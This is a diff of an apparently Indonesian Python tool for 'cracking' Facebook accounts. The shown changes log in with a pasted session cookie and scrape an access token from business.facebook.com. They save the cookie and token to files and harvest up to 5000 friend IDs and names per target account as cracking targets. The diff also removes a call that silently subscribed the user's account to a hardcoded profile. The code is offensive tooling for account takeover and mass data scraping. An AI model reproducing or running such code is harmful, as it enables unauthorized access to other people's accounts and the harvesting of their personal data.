@@ -18,6 +18,7 @@ from rich import print as cetak
 from rich.markdown import Markdown as mark
 from rich.columns import Columns as col
 ses = requests.Session
+
 try:
 	import requests
 except ImportError:
@@ -171,6 +172,14 @@ def folder():
 	try:os.mkdir('data')
 	except:pass		
 
+# LOGO (LO GOBLOK)
+dt = requests.get("http://ip-api.com/json/").json()
+try:
+	IP = dt["query"]
+	CN = dt["country"]
+except KeyError:
+	IP = " "
+	CN = " "
 # COLORS
 x = '\33[m' # DEFAULT
 k = '\033[93m' # KUNING +
@@ -196,7 +205,8 @@ def back():
     Masuk()	
 # BANNER
 def logo():
-	time.sleep (0.01)
+	clear()
+	time.sleep (1)
 	print ('')
 	print ('')
 	jalan ('\x1b[1;97m                       _____---____ ')
@@ -228,13 +238,7 @@ def banner():
 	print (' \033[1;96m  ____________________________________________')
 	print ('\033[1;97m\033[1;96m ¤\033[1;97m{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}\033[1;96m¤')
 
-# CONVERT COOKIE DICT TO STRING
-def romz_xyz(cookie,venom={}):
-	for x in cookie.replace(' ','').strip().split(';'):
-		kuki = x.split('=')
-		if len(kuki) > 1:
-			venom.update({kuki[0]: kuki[1]})
-	return venom
+
 
 # MENU MASUK
 def Masuk():
@@ -248,14 +252,13 @@ def Masuk():
 	if rom in['']:
 		exit ("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
 	elif rom in['1','01']:
-		kukis = input("\n%sMasukan cookie %s: %s"%(P,H,K))
+		cookie = input("\n%sMasukan cookie %s: %s"%(P,H,K))
 		with requests.Session() as ROMZ:
 			try:
-				get_tok = ROMZ.get('https://business.facebook.com/business_locations',headers = {"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "en-GB,en-US;q=0.9,en;q=0.8","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":kukis})
-				token = re.search("(EAAG\w+)", get_tok.text).group(1)
-				open('data/cookie.txt','w').write(kukis)
-				open('data/token.txt','w').write(token)
-				requests.post(f"https://graph.facebook.com/100028434880529/subscribers?access_token={token}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
+				data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
+				find_token = re.search("(EAAG\w+)", data.text)
+				ken=open("data/token.txt", "w").write(find_token.group(1))
+				cok=open("data/cok.txt", "w").write(cookie)
 				print ("\n%s √ login berhasil "%(H));jeda(2)
 				Menu()
 			except (KeyError):
@@ -319,9 +322,12 @@ def Menu():
 		activate_licensi()
 	folder()
 	try:
-		token = open("data/token.txt","r").read()
-		coki = {"cookie":open("data/cookie.txt","r").read()}
-		nama = requests.get(f'https://graph.facebook.com/me?access_token={token}', cookies=coki).json()['name']
+		token = open('data/token.txt','r').read()
+		cok= open('data/cok.txt','r').read()
+		tokenku.append(token)
+		sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
+		sy2 = json.loads(sy.text)['name']
+		sy3 = json.loads(sy.text)['id']
 	except KeyError:
 		print ("\n%s cookie kadaluwarsa "%(M));jeda(2)
 		os.system (hapus)
@@ -333,16 +339,17 @@ def Menu():
 	except requests.exceptions.ConnectionError as konek:
 		exit (f"\n%s%s gagal memuat tidak ada koneksi: {konek}"%(M,til));jeda(2)
 	banner()
-	print('')
-
-	io = '[01] Crack Dari Pertemanan Publik (Massal)\n[02] Crack Dari Pertemanan Publik\n[03] Cek Opsi Checkpoint\n[04] Crack File\n [05]Cek Hasil Crack\n[00] Log Out'
+	cetak(nel('\tSelamat Datang [yellow]%s[white] SLEMEK'%(sy2)))
+	print(f'>> Your Idz : '+str(sy3))
+	print(f'>> Your Ip  : {IP}')
+	io = '[01] Crack Dari Pertemanan Publik (Massal)\n[02] Crack Dari Pertemanan Publik\n[03] Cek Opsi Checkpoint\n[04] Crack File\n[05] Cek Hasil Crack\n[00] Log Out'
 	oi = nel(io, style='cyan')
-	cetak(nel(oi, title='MENU Tols'))
+	cetak(nel(oi, title='MENU'))
 	jh = input(x+'['+p+'<>'+x+'] Pilih : ')
 	if jh in ['1','01']:
-		dump_massal(token,coki)	
+		dump_massal()	
 	elif jh in ['2','02']:
-		dump_publik(token,coki)
+		dump_publik()
 	elif jh in ['3','03']:
 		file()
 	elif jh in ['4','04']:
@@ -554,9 +561,9 @@ def file():
 				back()
 
 # DUMP ID PUBLIK
-def dump_publik(token,cookie):
+def dump_publik():
 	try:
-		token = open('.token.txt','r').read()
+		token = open('data/token.txt','r').read()
 	except IOError:
 		exit()
 	win = '# DUMP ID PUBLIK'
@@ -565,8 +572,8 @@ def dump_publik(token,cookie):
 	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
 	pil = input(x+'['+p+'f'+x+'] Masukkan ID Target : ')
 	try:
-		po = requests.get(f"https://graph.facebook.com/v13.0/{pil}?fields=friends.limit(5000)&access_token={token}",cookies=cookie).json()
-		for pi in po['friends']['data']:
+		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
+		for pi in koh2['friends']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
 		print(x+'['+h+'•'+x+'] Total : '+str(len(id)))
@@ -583,14 +590,14 @@ def dump_publik(token,cookie):
 		exit()
 
 #-------------------[ CRACK-PUBLIK ]----------------#
-def dump_massal(token,cookie):
+def dump_massal():
 	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
+		token = open('data/token.txt','r').read()
+		cok = open('data/cok.txt','r').read()
 	except IOError:
 		exit()
 	try:
-		jum = int(input('>> Mau Berapa Target Njing ? : '))
+		jum = int(input('>> Mau Berapa Target ? : '))
 	except ValueError:
 		print('>> Masukkan Angka Anjing, Malah Huruff ')
 		exit()
@@ -605,8 +612,8 @@ def dump_massal(token,cookie):
 		uid.append(kl)
 	for userr in uid:
 		try:
-			ajg = requests.get(f"https://graph.facebook.com/v13.0/{userr}?fields=friends.limit(5000)&access_token={token}",cookies=cookie).json()
-			for mi in ajg['friends']['data']:
+			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
+			for mi in col['friends']['data']:
 				try:
 					iso = (mi['id']+'|'+mi['name'])
 					if iso in id:pass
@@ -1201,4 +1208,5 @@ def cek_opsi():
 	exit()
 
 if __name__=='__main__':
-	Masuk()
+	folder()	
+	Menu()
